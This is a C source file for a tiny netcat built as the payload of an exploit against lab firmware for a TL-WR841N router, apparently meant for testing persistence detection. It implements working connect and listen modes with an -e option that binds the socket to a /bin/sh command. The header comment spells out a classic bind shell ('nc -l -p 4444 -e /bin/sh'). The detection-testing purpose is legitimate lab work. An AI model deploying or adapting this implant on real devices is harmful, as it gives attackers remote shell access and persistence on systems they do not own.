/* SPDX-License-Identifier: GPL-3.0-or-later */
/* nc.c - tiny netcat for the TL-WR841N lab firmware (vuln.py payload).
 *
 * Deliberately minimal: no DNS, no UDP, no dual-stack. Just enough to test
 * detection of a known-and-expected persistence mechanism on a lab device.
 *
 * Usage:
 *   nc [-e CMD] HOST PORT      connect to HOST:PORT, pipe stdin/stdout
 *   nc -l -p PORT [-e CMD]     listen once on TCP/PORT, handle one connection
 *
 * With -e CMD, the socket replaces stdin/stdout/stderr and CMD is run through
 * /bin/sh -c (e.g. `nc -l -p 4444 -e /bin/sh`, the classic bind shell).
 *
 * Target: MIPS big-endian, soft-float, statically linked (see build.sh).
 */
#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <unistd.h>

static void die(const char *msg)
{
    fprintf(stderr, "nc: %s: %s\n", msg, strerror(errno));
    exit(1);
}

static void usage(const char *prog)
{
    fprintf(stderr,
            "Usage: %s [-e CMD] HOST PORT\n"
            "       %s -l -p PORT [-e CMD]\n", prog, prog);
    exit(2);
}

static int do_connect(const char *host, const char *port)
{
    struct sockaddr_in peer = {0};
    peer.sin_family = AF_INET;
    peer.sin_port = htons((unsigned short)atoi(port));
    peer.sin_addr.s_addr = inet_addr(host);
    if (peer.sin_addr.s_addr == INADDR_NONE) {
        fprintf(stderr, "nc: invalid address: %s (no DNS on purpose)\n", host);
        exit(2);
    }
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0)
        die("socket");
    if (connect(fd, (struct sockaddr *)&peer, sizeof(peer)) < 0)
        die("connect");
    return fd;
}

static int do_listen(const char *port)
{
    struct sockaddr_in self = {0}, client;
    socklen_t len = sizeof(client);
    self.sin_family = AF_INET;
    self.sin_addr.s_addr = htonl(INADDR_ANY);
    self.sin_port = htons((unsigned short)atoi(port));

    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0)
        die("socket");
    int one = 1;
    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    if (bind(fd, (struct sockaddr *)&self, sizeof(self)) < 0)
        die("bind");
    if (listen(fd, 1) < 0)
        die("listen");
    int cfd = accept(fd, (struct sockaddr *)&client, &len);
    if (cfd < 0)
        die("accept");
    close(fd);
    return cfd;
}

/* Relay between stdin/stdout and the socket until either side closes. */
static void pump(int fd)
{
    fd_set rfds;
    char buf[4096];
    int stdin_open = 1;

    for (;;) {
        FD_ZERO(&rfds);
        FD_SET(fd, &rfds);
        if (stdin_open)
            FD_SET(STDIN_FILENO, &rfds);
        if (select(fd + 1, &rfds, NULL, NULL, NULL) < 0) {
            if (errno == EINTR)
                continue;
            return;
        }
        if (FD_ISSET(fd, &rfds)) {
            ssize_t n = read(fd, buf, sizeof(buf));
            if (n <= 0)
                return;
            if (write(STDOUT_FILENO, buf, (size_t)n) < 0)
                return;
        }
        if (stdin_open && FD_ISSET(STDIN_FILENO, &rfds)) {
            ssize_t n = read(STDIN_FILENO, buf, sizeof(buf));
            if (n <= 0) {
                stdin_open = 0;
                shutdown(fd, SHUT_WR); /* half-close, keep reading the peer */
            } else if (write(fd, buf, (size_t)n) < 0) {
                return;
            }
        }
    }
}

/* Socket becomes stdio, then CMD runs; never returns. */
static void do_exec(int fd, const char *cmd)
{
    dup2(fd, STDIN_FILENO);
    dup2(fd, STDOUT_FILENO);
    dup2(fd, STDERR_FILENO);
    if (fd > STDERR_FILENO)
        close(fd);
    char *argv[] = {"sh", "-c", (char *)cmd, NULL};
    execvp(argv[0], argv);
    _exit(127);
}

int main(int argc, char **argv)
{
    signal(SIGPIPE, SIG_IGN);

    const char *host = NULL, *port = NULL, *cmd = NULL;
    int listen_mode = 0;

    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "-l")) {
            listen_mode = 1;
        } else if (!strcmp(argv[i], "-p") && i + 1 < argc) {
            port = argv[++i];
        } else if (!strcmp(argv[i], "-e") && i + 1 < argc) {
            cmd = argv[++i];
        } else if (!strcmp(argv[i], "-h") || !strcmp(argv[i], "--help")) {
            usage(argv[0]);
        } else if (!host) {
            host = argv[i];
        } else if (!port) {
            port = argv[i];
        } else {
            usage(argv[0]);
        }
    }

    int fd;
    if (listen_mode) {
        if (!port)
            usage(argv[0]);
        fd = do_listen(port);
    } else {
        if (!host || !port)
            usage(argv[0]);
        fd = do_connect(host, port);
    }

    if (cmd)
        do_exec(fd, cmd);
    else
        pump(fd);
    close(fd);
    return 0;
}
